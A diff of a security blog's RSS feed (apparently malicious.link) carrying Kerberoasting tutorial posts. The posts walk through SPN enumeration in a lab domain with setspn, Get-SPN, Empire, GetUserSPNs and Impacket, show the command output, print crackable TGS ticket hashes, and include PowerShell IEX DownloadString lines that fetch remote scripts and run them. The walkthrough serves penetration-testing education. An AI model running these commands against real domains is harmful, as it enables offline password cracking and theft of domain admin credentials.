 $krb5tgs$23$*sqladmin01$SITTINGDUCK.INFO$SPN*$6e5307df490c6e3339f613fdc5655785$80ba233b4d24531202f2e354c99e7eda807bde7aeeb48ee4cdb6bf809d78652413699e3cff8b9b78b9ee70e997a538155fc7f72e208d715020d458b8413d4b12b212738833c4694d84937d65cb8ecd0020c00a5d39c07da35a748ea2cb062fca4fa9b282e7046d70ee1cae4cfee7d6f791052e283
 $krb5tgs$23$*uberuser$SITTINGDUCK.INFO$SPN*$27c08ed2a8d5394f66e8c13c25c98393$310b787ec5c10b20fcc0acb1406b6a6e2ffddd71de3dc4c70c19e5dfcf262cc88574e61cb3940ebfd574b2bb555f2b05f84d8526e3cf46fc0ca57e03467729757cbf79da9f55cde9dabdda68e80dce6564e9f1b904b0585dbc813b82abf89e973e41c102b664f4c649f85acaf7904a273dddcb9315a66f27334f313190e1caf4f5055b671d250f5912cc1871a1dd4a6126087ddfb98ade8f7dde495ee8ad76583aa5a12eef63a690dd82a15eaaca0d7594f2f1dbc899035d89dd628b291590058cfb3405d1dfe4a383be5704465d9c8972ef8f1cba3541fdfa7dcf5063eaed74051fa18bd73f7b4f7d77
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Much easier ;-) oh, and did I mention that if you use Impacket&amp;rsquo;s version you can just use LM/NTLM hashes instead of a password? Awesome! Alright, all we have left is to crack these tickets and figure out how to use them&amp;hellip;&lt;/p&gt;
-
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Much easier ;-) oh, and did I mention that if you use Impacket&#39;s version you can just use LM/NTLM hashes instead of a password? Awesome! Alright, all we have left is to crack these tickets and figure out how to use them&amp;hellip;&lt;/p&gt;
 &lt;h1 id=&#34;references&#34;&gt;References:&lt;/h1&gt;
-
 &lt;h2 id=&#34;tools&#34;&gt;Tools&lt;/h2&gt;
-
 &lt;ul&gt;
 &lt;li&gt;&lt;a href=&#34;https://github.com/nidem/kerberoast&#34;&gt;Kerberoast&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href=&#34;https://github.com/coresecurity/impacket&#34;&gt;Impacket&lt;/a&gt;&lt;/li&gt;
@@ -343,22 +271,18 @@ $krb5tgs$23$*uberuser$SITTINGDUCK.INFO$SPN*$27c08ed2a8d5394f66e8c13c25c98393$310
 &lt;li&gt;&lt;a href=&#34;https://github.com/magnumripper/JohnTheRipper&#34;&gt;Github - John the Ripper - Magnumripper&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href=&#34;https://github.com/hashcat/oclHashcat&#34;&gt;Github - oclHashcat&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
-
 &lt;h2 id=&#34;presentations&#34;&gt;Presentations&lt;/h2&gt;
-
 &lt;ul&gt;
-&lt;li&gt;Tim Medin&amp;rsquo;s Slides - [Kicking the Guard Dog of Hades - slides](&lt;a href=&#34;https://files.sans.org/summit/hackfest2014/PDFs/Kicking%20the%20Guard%20Dog%20of%20Hades%20-%20Attacking%20Microsoft%20Kerberos%20%20-%20Tim%20Medin(1).pdf&#34;&gt;https://files.sans.org/summit/hackfest2014/PDFs/Kicking%20the%20Guard%20Dog%20of%20Hades%20-%20Attacking%20Microsoft%20Kerberos%20%20-%20Tim%20Medin(1).pdf&lt;/a&gt;)&lt;/li&gt;
-&lt;li&gt;Tim Medin&amp;rsquo;s Video - &lt;a href=&#34;https://www.youtube.com/watch?v=PUyhlN-E5MU&amp;amp;feature=youtu.be&#34;&gt;Kicking the Guard Dog of Hades - video&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Tim Medin&#39;s Slides - [Kicking the Guard Dog of Hades - slides](&lt;a href=&#34;https://files.sans.org/summit/hackfest2014/PDFs/Kicking%20the%20Guard%20Dog%20of%20Hades%20-%20Attacking%20Microsoft%20Kerberos%20%20-%20Tim%20Medin(1&#34;&gt;https://files.sans.org/summit/hackfest2014/PDFs/Kicking%20the%20Guard%20Dog%20of%20Hades%20-%20Attacking%20Microsoft%20Kerberos%20%20-%20Tim%20Medin(1&lt;/a&gt;).pdf)&lt;/li&gt;
+&lt;li&gt;Tim Medin&#39;s Video - &lt;a href=&#34;https://www.youtube.com/watch?v=PUyhlN-E5MU&amp;amp;feature=youtu.be&#34;&gt;Kicking the Guard Dog of Hades - video&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
-
 &lt;h2 id=&#34;other-write-ups&#34;&gt;Other write ups&lt;/h2&gt;
-
 &lt;ul&gt;
 &lt;li&gt;&lt;a href=&#34;http://malwarejake.blogspot.com/2015/11/kerberos-silver-tickets-unique-attacker.html&#34;&gt;Jacob Williams (MalwareJake) post about Silver Tickets being using in the wild&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;https://www.beneaththewaves.net/Projects/Mimikatz_20_-_Brute-Forcing_Service_Account_Passwords.html&#34;&gt;Ben Lincoln&amp;rsquo;s writeup on Brute Forcing Service Account Passwords&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;https://leonjza.github.io/blog/2016/01/09/kerberos-kerberoast-and-golden-tickets/&#34;&gt;Leon Jacob&amp;rsquo;s writeup on Kerberoast&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;https://adsecurity.org/?p=2293&#34;&gt;Sean Metcalf&amp;rsquo;s writeup on Kerberoast&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;https://adsecurity.org/?page_id=183&#34;&gt;Sean Metcalf&amp;rsquo;s SPN directory&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://www.beneaththewaves.net/Projects/Mimikatz_20_-_Brute-Forcing_Service_Account_Passwords.html&#34;&gt;Ben Lincoln&#39;s writeup on Brute Forcing Service Account Passwords&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://leonjza.github.io/blog/2016/01/09/kerberos-kerberoast-and-golden-tickets/&#34;&gt;Leon Jacob&#39;s writeup on Kerberoast&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://adsecurity.org/?p=2293&#34;&gt;Sean Metcalf&#39;s writeup on Kerberoast&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://adsecurity.org/?page_id=183&#34;&gt;Sean Metcalf&#39;s SPN directory&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
 </description>
     </item>
@@ -369,53 +293,33 @@ $krb5tgs$23$*uberuser$SITTINGDUCK.INFO$SPN*$27c08ed2a8d5394f66e8c13c25c98393$310
       <pubDate>Fri, 20 May 2016 07:35:28 -0500</pubDate>
       
       <guid>https://malicious.link/post/2016/kerberoast-pt1/</guid>
-      <description>
-
-&lt;p&gt;&lt;strong&gt;Previous works:&lt;/strong&gt; There has been a number of differnet blog posts, presentations and projects that have happened before this post and I will reference a number of them during the post and at the end have a link to all that I know about. If you know of any works on this subject that I am missing please submit a comment below and I&amp;rsquo;ll will be sure to reference it.&lt;/p&gt;
-
+      <description>&lt;p&gt;&lt;strong&gt;Previous works:&lt;/strong&gt; There has been a number of differnet blog posts, presentations and projects that have happened before this post and I will reference a number of them during the post and at the end have a link to all that I know about. If you know of any works on this subject that I am missing please submit a comment below and I&#39;ll will be sure to reference it.&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;Attacker KB Link:&lt;/strong&gt; (to be updated later)&lt;/p&gt;
-
 &lt;p&gt;&lt;strong&gt;Common Findings DB Link:&lt;/strong&gt; (to be updated later)&lt;/p&gt;
-
 &lt;h2 id=&#34;what-are-spns&#34;&gt;What are SPNs&lt;/h2&gt;
-
-&lt;p&gt;[Service Principal Names](&lt;a href=&#34;https://msdn.microsoft.com/en-us/library/ms677949(v=vs.85).aspx&#34;&gt;https://msdn.microsoft.com/en-us/library/ms677949(v=vs.85).aspx&lt;/a&gt;) (SPNs) are:&lt;/p&gt;
-
+&lt;p&gt;[Service Principal Names](&lt;a href=&#34;https://msdn.microsoft.com/en-us/library/ms677949(v=vs.85&#34;&gt;https://msdn.microsoft.com/en-us/library/ms677949(v=vs.85&lt;/a&gt;).aspx) (SPNs) are:&lt;/p&gt;
 &lt;blockquote&gt;
 &lt;p&gt;a unique identifier of a service instance. SPNs are used by Kerberos authentication to associate a service instance with a service logon account.&amp;rdquo; - MSDN&lt;/p&gt;
 &lt;/blockquote&gt;
-
-&lt;p&gt;Basically mapping a service running on a server to an account it&amp;rsquo;s running as so that it can do / accept kerberos authentication. Normally, these services, like &amp;ldquo;CIFS&amp;rdquo; (Windows Shares) run under the context of the computer account.&lt;/p&gt;
-
+&lt;p&gt;Basically mapping a service running on a server to an account it&#39;s running as so that it can do / accept kerberos authentication. Normally, these services, like &amp;ldquo;CIFS&amp;rdquo; (Windows Shares) run under the context of the computer account.&lt;/p&gt;
 &lt;h2 id=&#34;why-would-they-be-associated-with-users&#34;&gt;Why would they be associated with users?&lt;/h2&gt;
-
-&lt;p&gt;I won&amp;rsquo;t say that this is the reason for the change, but for a long time Information Security professionals (and bad guys) have exploited the idea that services run as the all powerful &lt;strong&gt;&amp;ldquo;NT AUTHORITY\SYSTEM&amp;rdquo;&lt;/strong&gt; account. For those who don&amp;rsquo;t know, this means that if someone exploits one of those services, they are basically ROOT on that machine in the Windows world.&lt;/p&gt;
-
-&lt;p&gt;One of the ways that Microsoft has enabled system administrators and software developers to step away from this paradigm is to create the [NT AUTHORITY\NETWORK SERVICE](&lt;a href=&#34;https://msdn.microsoft.com/en-us/library/windows/desktop/ms684272(v=vs.85).aspx&#34;&gt;https://msdn.microsoft.com/en-us/library/windows/desktop/ms684272(v=vs.85).aspx&lt;/a&gt;) and [NT AUTHORITY\LOCAL SERVICE](&lt;a href=&#34;https://msdn.microsoft.com/en-us/library/windows/desktop/ms684188(v=vs.85).aspx&#34;&gt;https://msdn.microsoft.com/en-us/library/windows/desktop/ms684188(v=vs.85).aspx&lt;/a&gt;) accounts. This allowed basic permissions and are great alternatives. However, these accounts, while perfectly limited, did not have any authentication abilities on the network. So, system administrators started using domain accounts to run services. This is where things go wrong again.&lt;/p&gt;
-
-&lt;p&gt;Yes, I know there is such a thing as [Managed Service Accounts](&lt;a href=&#34;https://technet.microsoft.com/en-us/library/dd560633(v=ws.10).aspx&#34;&gt;https://technet.microsoft.com/en-us/library/dd560633(v=ws.10).aspx&lt;/a&gt;) now (introduced in 2011 with a Windows Server 2008 R2 update) and spoiler alert, that&amp;rsquo;s the fix to the issue we will be discussing below and in the next few parts, but even MSAs have an issue that I&amp;rsquo;ll discuss in the last section of this series.&lt;/p&gt;
-
+&lt;p&gt;I won&#39;t say that this is the reason for the change, but for a long time Information Security professionals (and bad guys) have exploited the idea that services run as the all powerful &lt;strong&gt;&amp;ldquo;NT AUTHORITY\SYSTEM&amp;rdquo;&lt;/strong&gt; account. For those who don&#39;t know, this means that if someone exploits one of those services, they are basically ROOT on that machine in the Windows world.&lt;/p&gt;
+&lt;p&gt;One of the ways that Microsoft has enabled system administrators and software developers to step away from this paradigm is to create the [NT AUTHORITY\NETWORK SERVICE](&lt;a href=&#34;https://msdn.microsoft.com/en-us/library/windows/desktop/ms684272(v=vs.85&#34;&gt;https://msdn.microsoft.com/en-us/library/windows/desktop/ms684272(v=vs.85&lt;/a&gt;).aspx) and [NT AUTHORITY\LOCAL SERVICE](&lt;a href=&#34;https://msdn.microsoft.com/en-us/library/windows/desktop/ms684188(v=vs.85&#34;&gt;https://msdn.microsoft.com/en-us/library/windows/desktop/ms684188(v=vs.85&lt;/a&gt;).aspx) accounts. This allowed basic permissions and are great alternatives. However, these accounts, while perfectly limited, did not have any authentication abilities on the network. So, system administrators started using domain accounts to run services. This is where things go wrong again.&lt;/p&gt;
+&lt;p&gt;Yes, I know there is such a thing as [Managed Service Accounts](&lt;a href=&#34;https://technet.microsoft.com/en-us/library/dd560633(v=ws.10&#34;&gt;https://technet.microsoft.com/en-us/library/dd560633(v=ws.10&lt;/a&gt;).aspx) now (introduced in 2011 with a Windows Server 2008 R2 update) and spoiler alert, that&#39;s the fix to the issue we will be discussing below and in the next few parts, but even MSAs have an issue that I&#39;ll discuss in the last section of this series.&lt;/p&gt;
 &lt;h2 id=&#34;why-should-i-care&#34;&gt;Why should I care?&lt;/h2&gt;
-
 &lt;p&gt;Any valid domain user can request a kerberos ticket for any domain service (or even services outside the domain as long as there is a trust there). Once the ticket is received, password cracking can be done offline on the ticket to attempt to break the password for whatever user the service is running as. The users running these services usually are at the very least administrators on the computers for which they are a service on, but more commonly they are some sort of administrative account (Domain Admins).&lt;/p&gt;
-
 &lt;h2 id=&#34;listing-spns&#34;&gt;Listing SPNs&lt;/h2&gt;
-
 &lt;p&gt;Ok, so, now you know the background and why you want to do this attack,  but how do we go about listing what SPNs are out there for the domain you are on. There are a ton of ways to do this:&lt;/p&gt;
-
 &lt;ol&gt;
 &lt;li&gt;Just use the built in &lt;code&gt;SetSPN.exe&lt;/code&gt; built into Windows&lt;/li&gt;
 &lt;li&gt;Use the &lt;a href=&#34;https://github.com/nullbind/Powershellery/tree/master/Stable-ish/Get-SPN&#34;&gt;Get-SPN.ps1&lt;/a&gt; that &lt;a href=&#34;https://twitter.com/_nullbind&#34;&gt;@_nullbind&lt;/a&gt; (Scott Sutherland) posted about on the NetSPI blog in a post titled &lt;a href=&#34;https://blog.netspi.com/faster-domain-escalation-using-ldap/&#34;&gt;Faster Domain Escalation using LDAP&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;Use the &lt;a href=&#34;https://github.com/PowerShellEmpire/Empire&#34;&gt;PowerShell Empire&lt;/a&gt; &lt;a href=&#34;https://github.com/PowerShellEmpire/Empire/blob/master/lib/modules/situational_awareness/network/get_spn.py&#34;&gt;port of @_nullbind&amp;rsquo;s Get-SPN powershell script&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;Use &lt;a href=&#34;https://twitter.com/timmedin&#34;&gt;Tim Medin - @timmedin&lt;/a&gt;&amp;rsquo;s &lt;a href=&#34;https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.vbs&#34;&gt;GetUserSPNs VB script&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;Use &lt;a href=&#34;https://twitter.com/timmedin&#34;&gt;Tim Medin - @timmedin&lt;/a&gt;&amp;rsquo;s &lt;a href=&#34;https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1&#34;&gt;GetUserSPNs PowerShell script&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;Use &lt;a href=&#34;https://github.com/CoreSecurity/impacket&#34;&gt;Impacket&lt;/a&gt;&amp;rsquo;s &lt;a href=&#34;https://github.com/CoreSecurity/impacket/blob/master/examples/GetUserSPNs.py&#34;&gt;GetUserSPN.py&lt;/a&gt; - unlike the other tools and techniques, this one executes without the advantage of the Windows tokes, so you are going to need credentials, but this is also the advantage as you are not loading anything on disk or executing anything through the use of cmd.exe or powershell.exe&lt;/li&gt;
+&lt;li&gt;Use the &lt;a href=&#34;https://github.com/PowerShellEmpire/Empire&#34;&gt;PowerShell Empire&lt;/a&gt; &lt;a href=&#34;https://github.com/PowerShellEmpire/Empire/blob/master/lib/modules/situational_awareness/network/get_spn.py&#34;&gt;port of @_nullbind&#39;s Get-SPN powershell script&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Use &lt;a href=&#34;https://twitter.com/timmedin&#34;&gt;Tim Medin - @timmedin&lt;/a&gt;&amp;lsquo;s &lt;a href=&#34;https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.vbs&#34;&gt;GetUserSPNs VB script&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Use &lt;a href=&#34;https://twitter.com/timmedin&#34;&gt;Tim Medin - @timmedin&lt;/a&gt;&amp;lsquo;s &lt;a href=&#34;https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1&#34;&gt;GetUserSPNs PowerShell script&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Use &lt;a href=&#34;https://github.com/CoreSecurity/impacket&#34;&gt;Impacket&lt;/a&gt;&amp;lsquo;s &lt;a href=&#34;https://github.com/CoreSecurity/impacket/blob/master/examples/GetUserSPNs.py&#34;&gt;GetUserSPN.py&lt;/a&gt; - unlike the other tools and techniques, this one executes without the advantage of the Windows tokes, so you are going to need credentials, but this is also the advantage as you are not loading anything on disk or executing anything through the use of cmd.exe or powershell.exe&lt;/li&gt;
 &lt;/ol&gt;
-
 &lt;h3 id=&#34;1-setspn&#34;&gt;1. SetSPN&lt;/h3&gt;
-
 &lt;p&gt;SetSPN is a tool built into Windows and will do that job perfectly just as Tim Medin describes in his &lt;a href=&#34;http://www.irongeek.com/i.php?page=videos/derbycon4/t120-attacking-microsoft-kerberos-kicking-the-guard-dog-of-hades-tim-medin&#34;&gt;presentation&lt;/a&gt; and &lt;a href=&#34;https://github.com/nidem/kerberoast&#34;&gt;Kerberoast Github repo&lt;/a&gt;:&lt;/p&gt;
-
 &lt;pre&gt;&lt;code&gt;C:\&amp;gt;setspn -t sittingduck -q */*
 Checking domain DC=sittingduck,DC=info
 CN=DC1,OU=Domain Controllers,DC=sittingduck,DC=info
@@ -490,20 +394,13 @@ CN=MSSQL Service Admin,CN=Users,DC=sittingduck,DC=info
         MSSQLSvc/WIN2K8R2.sittingduck.info
 
 Existing SPN found!
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Each line that starts with &amp;ldquo;CN&amp;rdquo; is an account&amp;rdquo; and the SPNs under it are the ones associated with that account. Lots of great information can be determined just from the output of this command. Even though for cracking purposes we only want the SPNs associated with possibly weak password accounts (usually only User accounts), we should still pull this information down.&lt;/p&gt;
-
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Each line that starts with &amp;ldquo;CN&amp;rdquo; is an account&amp;rdquo; and the SPNs under it are the ones associated with that account. Lots of great information can be determined just from the output of this command. Even though for cracking purposes we only want the SPNs associated with possibly weak password accounts (usually only User accounts), we should still pull this information down.&lt;/p&gt;
 &lt;h3 id=&#34;get-spn&#34;&gt;Get-SPN&lt;/h3&gt;
-
 &lt;ul&gt;
-&lt;li&gt;Link: &lt;a href=&#34;https://github.com/nullbind/Powershellery/tree/master/Stable-ish/Get-SPN&#34;&gt;nullbind&amp;rsquo;s Get-SPN folder in the Powershellery repo&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Link: &lt;a href=&#34;https://github.com/nullbind/Powershellery/tree/master/Stable-ish/Get-SPN&#34;&gt;nullbind&#39;s Get-SPN folder in the Powershellery repo&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
-
 &lt;p&gt;This module gives you a lot more information than SetSPN did. Having the PasswordLastSet and LastLogon helps to figure out when and &lt;em&gt;if&lt;/em&gt; an account has ever been used. In the example below the &amp;ldquo;sqladmin01&amp;rdquo; account has never logged on and was created recently. If this password cracks then there is a good chance that it is some common password set when setting up accounts&lt;/p&gt;
-
 &lt;p&gt;&lt;strong&gt;Disclaimer:&lt;/strong&gt; As of this writing, this module only works with PowerShell 3.0+&lt;/p&gt;
-
 &lt;pre&gt;&lt;code&gt;PS C:\&amp;gt; IEX (New-Object Net.WebClient).DownloadString(&amp;quot;https://raw.githubusercontent.com/
 nullbind/Powershellery/master/Stable-ish/Get-SPN/Get-SPN.psm1&amp;quot;)
 PS C:\&amp;gt; Get-SPN -type service -search &amp;quot;MSSQL*&amp;quot;
@@ -525,18 +422,12 @@ SPN Count       : 1
 ServicePrincipalNames (SPN):
 MSSQLSvc/WIN2K8R2.sittingduck.info
 
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h3 id=&#34;powershell-empire&#34;&gt;PowerShell Empire&lt;/h3&gt;
-
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;powershell-empire&#34;&gt;PowerShell Empire&lt;/h3&gt;
 &lt;ul&gt;
 &lt;li&gt;Link: &lt;a href=&#34;https://github.com/PowerShellEmpire/Empire/blob/master/lib/modules/situational_awareness/network/get_spn.py&#34;&gt;PowerShell Empire get_spn module&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
-
 &lt;p&gt;This module basically just incorporates the script from above.&lt;/p&gt;
-
 &lt;p&gt;&lt;strong&gt;Disclaimer:&lt;/strong&gt; As of this writing, this module only works with PowerShell 3.0+&lt;/p&gt;
-
 &lt;pre&gt;&lt;code&gt;(Empire: situational_awareness/network/get_spn) &amp;gt; info
 
            Name: Get-SPN
@@ -566,18 +457,12 @@ Options:
 
 (Empire: situational_awareness/network/get_spn) &amp;gt;
 
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&#34;listing-user-spns&#34;&gt;Listing User SPNs&lt;/h2&gt;
-
-&lt;h3 id=&#34;getuserspns-vbs&#34;&gt;GetUserSPNs.vbs&lt;/h3&gt;
-
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;listing-user-spns&#34;&gt;Listing User SPNs&lt;/h2&gt;
+&lt;h3 id=&#34;getuserspnsvbs&#34;&gt;GetUserSPNs.vbs&lt;/h3&gt;
 &lt;ul&gt;
-&lt;li&gt;Link: &lt;a href=&#34;https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.vbs&#34;&gt;Kerberoast&amp;rsquo;s GetUserSPNs.vbs&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Link: &lt;a href=&#34;https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.vbs&#34;&gt;Kerberoast&#39;s GetUserSPNs.vbs&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
-
-&lt;p&gt;GetUserSPNs was the first script to focus only on accounts that were Users. When you are looking at a network that has 40,000+ Windows boxes and all of the has the &amp;ldquo;HOST&amp;rdquo; SPN, it&amp;rsquo;s a lot to trudge through. This script cuts the fat and just gives you the list of SPNs that have a much higher chance of having their accounts cracked.&lt;/p&gt;
-
+&lt;p&gt;GetUserSPNs was the first script to focus only on accounts that were Users. When you are looking at a network that has 40,000+ Windows boxes and all of the has the &amp;ldquo;HOST&amp;rdquo; SPN, it&#39;s a lot to trudge through. This script cuts the fat and just gives you the list of SPNs that have a much higher chance of having their accounts cracked.&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;C:\temp&amp;gt; cscript GetUserSPNs.vbs
 Microsoft (R) Windows Script Host Version 5.8
 Copyright (C) Microsoft Corporation. All rights reserved.
@@ -593,18 +478,12 @@ User Logon: krbtgt
 CN=MSSQL Service Admin,CN=Users,DC=sittingduck,DC=info
 User Logon: sqladmin01
 -- MSSQLSvc/WIN2K8R2.sittingduck.info
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h3 id=&#34;getuserspns-ps1&#34;&gt;GetUserSPNs.ps1&lt;/h3&gt;
-
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;getuserspnsps1&#34;&gt;GetUserSPNs.ps1&lt;/h3&gt;
 &lt;ul&gt;
-&lt;li&gt;Link: &lt;a href=&#34;https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1&#34;&gt;Kerberoast&amp;rsquo;s GetUserSPNs.ps1&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Link: &lt;a href=&#34;https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1&#34;&gt;Kerberoast&#39;s GetUserSPNs.ps1&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
-
 &lt;p&gt;I really like this script because it tells you the time the password was last set. This allows for you to make educated selections on which accounts to attack with your password cracking. (More hashes needed to crack, the longer it takes)&lt;/p&gt;
-
-&lt;p&gt;Below I use the &lt;code&gt;IEX&lt;/code&gt; (Invoke-Expression) command in PowerShell to download and run the PowerShell script directly from Tim&amp;rsquo;s repository, but you could just as easily upload it and run it.&lt;/p&gt;
-
+&lt;p&gt;Below I use the &lt;code&gt;IEX&lt;/code&gt; (Invoke-Expression) command in PowerShell to download and run the PowerShell script directly from Tim&#39;s repository, but you could just as easily upload it and run it.&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;PS C:\&amp;gt; IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercon
 tent.com/nidem/kerberoast/master/GetUserSPNs.ps1&#39;)
 
@@ -614,16 +493,11 @@ e
 http/win10.sitti... Uber User           CN=Domain Admins... 11/10/2015 11:47...
 kadmin/changepw     krbtgt              CN=Denied RODC P... 11/10/2015 6:18:...
 MSSQLSvc/WIN2K8R... MSSQL Service Admin                     5/13/2016 7:13:2...
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h3 id=&#34;impacket&#34;&gt;Impacket&lt;/h3&gt;
-
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;impacket&#34;&gt;Impacket&lt;/h3&gt;
 &lt;ul&gt;
-&lt;li&gt;Link: &lt;a href=&#34;https://github.com/CoreSecurity/impacket/blob/master/examples/GetUserSPNs.py&#34;&gt;Impacket&amp;rsquo;s GetUserSPNs.py&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Link: &lt;a href=&#34;https://github.com/CoreSecurity/impacket/blob/master/examples/GetUserSPNs.py&#34;&gt;Impacket&#39;s GetUserSPNs.py&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
-
-&lt;p&gt;Impacket is a recent addition to the list of tools that perform SPN listing. &lt;a href=&#34;https://github.com/CoreSecurity/impacket/pull/153&#34;&gt;Pull request #153 - TGS-Response code to work with windows AD&lt;/a&gt; was all it took to motivate &lt;a href=&#34;https://twitter.com/agsolino&#34;&gt;@agsolino&lt;/a&gt; into making an example script and while &lt;a href=&#34;https://github.com/skelsec/PyKerberoast&#34;&gt;PyKerberoast&lt;/a&gt; by &lt;a href=&#34;https://twitter.com/skelsec&#34;&gt;@skelsec&lt;/a&gt; came first, it doesn&amp;rsquo;t have a plain &amp;ldquo;list&amp;rdquo; function so I wanted to save it for the extraction post.&lt;/p&gt;
-
+&lt;p&gt;Impacket is a recent addition to the list of tools that perform SPN listing. &lt;a href=&#34;https://github.com/CoreSecurity/impacket/pull/153&#34;&gt;Pull request #153 - TGS-Response code to work with windows AD&lt;/a&gt; was all it took to motivate &lt;a href=&#34;https://twitter.com/agsolino&#34;&gt;@agsolino&lt;/a&gt; into making an example script and while &lt;a href=&#34;https://github.com/skelsec/PyKerberoast&#34;&gt;PyKerberoast&lt;/a&gt; by &lt;a href=&#34;https://twitter.com/skelsec&#34;&gt;@skelsec&lt;/a&gt; came first, it doesn&#39;t have a plain &amp;ldquo;list&amp;rdquo; function so I wanted to save it for the extraction post.&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;root@wpad:~/impacket/examples# ./GetUserSPNs.py -dc-ip 192.168.168.10 sittingduck.info/notanadmin
 Impacket v0.9.15-dev - Copyright 2002-2016 Core Security Technologies
 
@@ -632,14 +506,9 @@ ServicePrincipalName                Name        MemberOf                        
 ----------------------------------  ----------  ------------------------------------------------  -------------------
 http/win10.sittingduck.info         uberuser    CN=Domain Admins,CN=Users,DC=sittingduck,DC=info  2015-11-10 23:47:21
 MSSQLSvc/WIN2K8R2.sittingduck.info  sqladmin01                                                    2016-05-13 19:13:20
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;And that is it for now. We have listed all of the SPNs or just the ones we needed. In Part 2 we will make requests for the SPN tickets we want.&lt;/p&gt;
-
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And that is it for now. We have listed all of the SPNs or just the ones we needed. In Part 2 we will make requests for the SPN tickets we want.&lt;/p&gt;
 &lt;h1 id=&#34;references&#34;&gt;References:&lt;/h1&gt;
-
 &lt;h2 id=&#34;tools&#34;&gt;Tools&lt;/h2&gt;
-
 &lt;ul&gt;
 &lt;li&gt;&lt;a href=&#34;https://github.com/nidem/kerberoast&#34;&gt;Kerberoast&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href=&#34;https://github.com/coresecurity/impacket&#34;&gt;Impacket&lt;/a&gt;&lt;/li&gt;
@@ -647,22 +516,18 @@ MSSQLSvc/WIN2K8R2.sittingduck.info  sqladmin01                                  
 &lt;li&gt;&lt;a href=&#34;https://github.com/magnumripper/JohnTheRipper&#34;&gt;Github - John the Ripper - Magnumripper&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href=&#34;https://github.com/hashcat/oclHashcat&#34;&gt;Github - oclHashcat&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
-
 &lt;h2 id=&#34;presentations&#34;&gt;Presentations&lt;/h2&gt;
-
 &lt;ul&gt;
-&lt;li&gt;Tim Medin&amp;rsquo;s Slides - [Kicking the Guard Dog of Hades - slides](&lt;a href=&#34;https://files.sans.org/summit/hackfest2014/PDFs/Kicking%20the%20Guard%20Dog%20of%20Hades%20-%20Attacking%20Microsoft%20Kerberos%20%20-%20Tim%20Medin(1).pdf&#34;&gt;https://files.sans.org/summit/hackfest2014/PDFs/Kicking%20the%20Guard%20Dog%20of%20Hades%20-%20Attacking%20Microsoft%20Kerberos%20%20-%20Tim%20Medin(1).pdf&lt;/a&gt;)&lt;/li&gt;
-&lt;li&gt;Tim Medin&amp;rsquo;s Video - &lt;a href=&#34;https://www.youtube.com/watch?v=PUyhlN-E5MU&amp;amp;feature=youtu.be&#34;&gt;Kicking the Guard Dog of Hades - video&lt;/a&gt;&lt;/li&gt;
